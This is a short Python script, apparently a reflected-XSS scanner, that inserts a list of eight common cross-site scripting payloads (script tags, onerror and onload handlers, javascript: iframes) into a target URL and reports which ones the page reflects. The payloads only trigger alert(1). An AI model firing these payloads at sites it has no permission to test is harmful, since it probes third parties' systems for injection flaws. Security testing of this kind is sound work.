import requests
import sys

# 🧬 List of payloads
payloads = [
    "<script>alert(1)</script>",
    "'\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "';alert(1);//",
    "\"><svg/onload=alert(1)>",
    "<body onload=alert(1)>"
]

def scan(url_template):
    for payload in payloads:
        test_url = url_template.replace("XSS", payload)
        try:
            r = requests.get(test_url, verify=False, timeout=5)
            if payload in r.text:
                print(f"[🔥] XSS Found with payload: {payload}")
                print(f"     → {test_url}\n")
            else:
                print(f"[❌] Not vulnerable with: {payload}")
        except Exception as e:
            print(f"[⚠️] Error testing {payload}: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 xss_scanner.py 'http://target.com/page?input=XSS'")
        sys.exit(1)
    scan(sys.argv[1])
